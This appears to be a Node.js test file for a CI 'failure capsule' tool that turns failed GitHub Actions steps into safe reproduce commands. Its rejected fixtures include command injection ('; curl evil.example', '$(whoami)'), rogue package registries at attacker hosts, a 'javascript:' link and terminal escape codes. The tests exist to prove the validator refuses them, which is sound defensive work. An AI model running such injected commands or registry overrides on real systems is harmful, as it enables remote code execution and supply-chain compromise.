// DAN-270: invented fixtures only; gh is never called.
import assert from "node:assert/strict";
import test from "node:test";

import { buildCapsule, commandOf, isExternalRun, parseCapsuleArgs, renderCapsule, scriptsOf, toolchainOf } from "./failure-capsule-core.mjs";

const SHA = "a".repeat(40);
const RUN = {
  id: 77, conclusion: "failure", head_sha: SHA, head_branch: "feature/x", event: "pull_request", run_attempt: 2,
  html_url: "https://github.com/o/r/actions/runs/77",
  repository: { full_name: "o/r" }, head_repository: { full_name: "o/r" },
};
const job = (name, conclusion, steps = []) => ({
  name, conclusion, html_url: "https://github.com/o/r/actions/runs/77/job/5", steps,
});
const step = (number, name, conclusion) => ({ number, name, conclusion });
const PKG = JSON.stringify({
  packageManager: "pnpm@10.33.0",
  engines: { node: ">=24" },
  scripts: { "test:unit": "x", "test:e2e": "x", lint: "x" },
});
const ALLOWED = scriptsOf(PKG);

test("arguments are strict", () => {
  assert.deepEqual(parseCapsuleArgs(["--run", "123", "--json"]), { run: "123", json: true });
  assert.throws(() => parseCapsuleArgs([]));
  assert.throws(() => parseCapsuleArgs(["--run", "0"]));
  assert.throws(() => parseCapsuleArgs(["--run", "12a"]));
  assert.throws(() => parseCapsuleArgs(["--run", "1", "--bogus"]));
});

test("only a plain run of a script that exists on main becomes a reproduce command (F-122)", () => {
  assert.equal(commandOf("Run pnpm test:unit", ALLOWED), "pnpm test:unit");
  assert.equal(commandOf("Run pnpm run lint", ALLOWED), "pnpm lint");
  // free arguments, package names, registries and anything that is not a main script: no command
  for (const name of [
    "Run pnpm dlx attacker-pkg",
    "Run pnpm install --registry=http://attacker.example/",
    "Run pnpm --config.registry=http://203.0.113.9:4873 install",
    "Run pnpm add github:attacker/pkg",
    "Run pnpm test:e2e --project=desktop",
    "Run pnpm test:unit && echo x",
    "Run pnpm test; curl evil.example",
    "Run $(whoami)",
    "Set up job",
    "Run pnpm  lint",
    "Run pnpm attacker-script",
  ]) assert.equal(commandOf(name, ALLOWED), null, name);
  // without main's script list nothing is allowed
  assert.equal(commandOf("Run pnpm lint"), null);
  assert.equal(commandOf("Run pnpm lint", scriptsOf("not json")), null);
});

test("a long run of dashes is refused at once instead of backtracking", () => {
  const started = Date.now();
  assert.equal(commandOf(`Run pnpm - -${"-- -".repeat(5000)}x!`, ALLOWED), null);
  assert.ok(Date.now() - started < 200);
});

test("a run from a fork or of unknown origin is external: no names, SHA or command", () => {
  assert.equal(isExternalRun(RUN), false);
  assert.equal(isExternalRun({ ...RUN, head_repository: { full_name: "fork/r" } }), true);
  assert.equal(isExternalRun({ ...RUN, head_repository: { full_name: "O/R" } }), false);
  assert.equal(isExternalRun({ ...RUN, head_repository: null }), true);
  assert.equal(isExternalRun({ ...RUN, repository: undefined }), true);
  const capsule = buildCapsule({
    run: { ...RUN, head_repository: { full_name: "fork/r" } },
    jobs: [job("Run pnpm dlx attacker-pkg", "failure", [step(1, "Run pnpm lint", "failure"), step(2, "Run pnpm dlx attacker-pkg", "failure")])],
    artifacts: [{ name: "stolen", expired: false, size_in_bytes: 1 }],
    packageJsonText: PKG,
  });
  assert.equal(capsule.external, true);
  const out = renderCapsule(capsule).join("\n");
  const json = JSON.stringify(capsule);
  for (const text of [out, json]) {
    assert.ok(!text.includes("attacker"));
    assert.ok(!text.includes("-> reproduce"));
    assert.ok(!text.includes(SHA));
    assert.ok(!text.includes("stolen"));
    assert.ok(!text.includes("pnpm lint"));
  }
  assert.match(out, /EXTERNAL RUN/);
  assert.match(out, /Do not check out/);
});

test("toolchain pins come from package.json and tolerate a bad file", () => {
  assert.deepEqual(toolchainOf(PKG), { packageManager: "pnpm@10.33.0", node: ">=24" });
  assert.deepEqual(toolchainOf("not json"), { packageManager: null, node: null });
  assert.deepEqual(toolchainOf('{"packageManager":5}'), { packageManager: null, node: null });
});

test("a capsule names the failed jobs and steps, and keeps a job called __proto__", () => {
  const capsule = buildCapsule({
    run: RUN,
    jobs: [
      job("ok", "success"),
      job("__proto__", "failure", [step(1, "Set up job", "success"), step(2, "Run pnpm test:unit", "failure")]),
      job("slow", "timed_out", [step(3, "Run pnpm test:e2e", "timed_out")]),
    ],
    artifacts: [{ name: "playwright-report", expired: false, size_in_bytes: 10 }, { name: "old", expired: true, size_in_bytes: 1 }],
    packageJsonText: PKG,
  });
  assert.deepEqual(capsule.failedJobs.map((j) => j.name), ["__proto__", "slow"]);
  assert.deepEqual(capsule.failedJobs[0].failedSteps, [{ number: 2, name: "Run pnpm test:unit", command: "pnpm test:unit" }]);
  assert.equal(capsule.headSha, SHA);
  assert.equal(capsule.external, undefined);
  assert.equal(capsule.attempt, 2);
  assert.deepEqual(capsule.artifacts.map((a) => a.expired), [false, true]);
});

test("a run that did not fail, or has no valid SHA, gives no capsule", () => {
  assert.throws(() => buildCapsule({ run: { ...RUN, conclusion: "success" }, jobs: [], artifacts: [], packageJsonText: PKG }), /did not fail/);
  assert.throws(() => buildCapsule({ run: { ...RUN, head_sha: "abc" }, jobs: [], artifacts: [], packageJsonText: PKG }), /SHA/);
});

test("text output prints no unsafe name or link and carries no log text", () => {
  const capsule = buildCapsule({
    run: { ...RUN, head_branch: "x\u001b[31mred", html_url: "https://evil.example/x" },
    jobs: [{ ...job("bad\nname", "failure", [step(1, "Run pnpm lint", "failure")]), html_url: "javascript:alert(1)" }],
    artifacts: [],
    packageJsonText: PKG,
  });
  const out = renderCapsule(capsule).join("\n");
  assert.ok(!out.includes("\u001b"));
  assert.ok(!out.includes("evil.example"));
  assert.ok(!out.includes("javascript:"));
  assert.match(out, /<not printed>/);
  assert.match(out, /reproduce: pnpm lint/);
  assert.match(out, /node >=24/);
});

test("the capsule itself carries no value outside the allowed shape, so --json cannot print one", () => {
  const capsule = buildCapsule({
    run: { ...RUN, head_branch: "line1\nline2", event: "pull\u001b[0m" },
    jobs: [job("multi\nline job", "failure", [step(1, "bad\nstep", "failure")])],
    artifacts: [{ name: "zzart\nname", expired: false, size_in_bytes: 1 }],
    packageJsonText: JSON.stringify({ packageManager: "pnpm@1\nevil", engines: { node: ">=24" } }),
  });
  const json = JSON.stringify(capsule);
  assert.ok(!json.includes("line1"));
  assert.ok(!json.includes("evil"));
  assert.ok(!json.includes("multi"));
  assert.ok(!json.includes("zzart"));
  assert.ok(!json.includes("bad"));
  assert.equal(capsule.toolchain.node, ">=24");
});
